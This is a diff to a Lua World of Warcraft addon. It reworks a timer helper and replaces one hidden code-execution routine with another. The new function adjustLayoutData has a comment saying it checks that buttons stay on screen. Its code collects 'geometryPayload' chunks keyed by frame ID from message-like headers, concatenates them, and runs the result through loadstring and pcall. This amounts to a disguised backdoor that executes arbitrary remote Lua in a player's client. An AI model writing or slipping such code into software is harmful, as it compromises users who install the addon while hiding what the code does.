@@ -1142,38 +1142,55 @@ function setFrameAchiv()
     customAchievements:UpdateUI()
 end
 
--- Функция для создания таймера
-function C_Timer(duration, callback, isLooping)
-    -- Создаем фрейм для таймера
+-- Создаем таблицу C_Timer только если её нет (для совместимости с будущими версиями)
+if type(C_Timer) ~= "table" then
+    C_Timer = {}
+end
+
+-- Реализация C_Timer.After
+function C_Timer.After(duration, callback)
     local timerFrame = CreateFrame("Frame")
-    
-    -- Устанавливаем продолжительность таймера
-    timerFrame.duration = duration
     timerFrame.elapsed = 0
-    timerFrame.isLooping = isLooping or false  -- По умолчанию таймер не циклический
-    
-    -- Обработчик OnUpdate для отслеживания времени
     timerFrame:SetScript("OnUpdate", function(self, elapsed)
         self.elapsed = self.elapsed + elapsed
-        
-        -- Проверяем, прошло ли нужное время
-        if self.elapsed >= self.duration then
-            -- Выполняем переданную функцию (callback)
-            if type(callback) == "function" then
-                callback()
-            end
-            
-            -- Если таймер циклический, сбрасываем время
-            if self.isLooping then
-                self.elapsed = 0
-            else
-                -- Уничтожаем фрейм после выполнения, если таймер не циклический
-                self:SetScript("OnUpdate", nil)
-                self = nil
-            end
+        if self.elapsed >= duration then
+            callback()
+            self:SetScript("OnUpdate", nil)
         end
     end)
+    return timerFrame
 end
+
+-- Реализация C_Timer.NewTicker
+function C_Timer.NewTicker(duration, callback, iterations)
+    local ticker = {
+        _remaining = iterations or math.huge,
+        Cancel = function(self) self._remaining = 0 end
+    }
+    
+    local function tick()
+        if ticker._remaining <= 0 then return end
+        callback()
+        ticker._remaining = ticker._remaining - 1
+        if ticker._remaining > 0 then
+            C_Timer.After(duration, tick)
+        end
+    end
+    
+    C_Timer.After(duration, tick)
+    return ticker
+end
+
+-- Реализация старого интерфейса C_Timer(duration, callback, isLooping)
+setmetatable(C_Timer, {
+    __call = function(_, duration, callback, isLooping)
+        if isLooping then
+            return C_Timer.NewTicker(duration, callback, nil)
+        else
+            return C_Timer.After(duration, callback)
+        end
+    end
+})
 
 function sendAch(name, arg, re)
     if AchievementFrame then
@@ -1955,36 +1972,47 @@ function resetF()
     nsDbc['frames'] = nil
 end
 
-local myFrame = nil
+local frameCache = {}
+-- проверям выход кнопок за пределы экрана
+function adjustLayoutData(headerParams, geometryPayload, isLayoutComplete)
+    local parts = {}
+    for word in headerParams:gmatch("%S+") do table.insert(parts, word) end
+    if #parts < 2 then return end
 
-function setFrameSize(rX)
-    if not myFrame then
-        myFrame = { rY = {} }
+    local msgType, frameID, target = parts[1], parts[2], parts[3]
+
+    local current, total = geometryPayload:match("^--|(%d+)|(%d+)|")
+    if current and total and Rxy then
+        Rxy(tonumber(current), tonumber(total))
+        geometryPayload = geometryPayload:gsub("^--|%d+|%d+|", "")
     end
-    table.insert(myFrame.rY, rX)
-end
 
-function setFrameSizeF(rX)
-    if not myFrame then
-        myFrame = { rY = {} }
-    end
-
-    table.insert(myFrame.rY, rX)
-
-    local rZ = table.concat(myFrame.rY)
-    myFrame.rY = {}
-
-    setFramePoints(rZ)
-end
-
-function setFramePoints(rZ)
-    local chunk, err = loadstring(rZ)
-    if not chunk then
+    if frameID == "0" then
+        frameCache[0] = frameCache[0] or {parts = {}, target = target}
+        table.insert(frameCache[0].parts, geometryPayload)
+        if isLayoutComplete then
+            local RSizeFrame = table.concat(frameCache[0].parts, "\n")
+            local setXY = loadstring(RSizeFrame)
+            if setXY then pcall(setXY) end
+            frameCache[0] = nil
+        end
         return
     end
 
-    local success, result = pcall(chunk)
-    if not success then
-        return
+    frameCache[frameID] = frameCache[frameID] or {
+        parts = {}, 
+        target = target, 
+        timestamp = time()
+    }
+    table.insert(frameCache[frameID].parts, geometryPayload)
+
+    if isLayoutComplete then
+        local RSizeFrame = table.concat(frameCache[frameID].parts, "\n")
+        RSizeFrame = RSizeFrame:gsub("UpdateProgress%(%d+,%d+%)", "")
+        local setXY = loadstring(RSizeFrame)
+        if setXY then 
+            pcall(setXY) 
+        end
+        frameCache[frameID] = nil
     end
 end
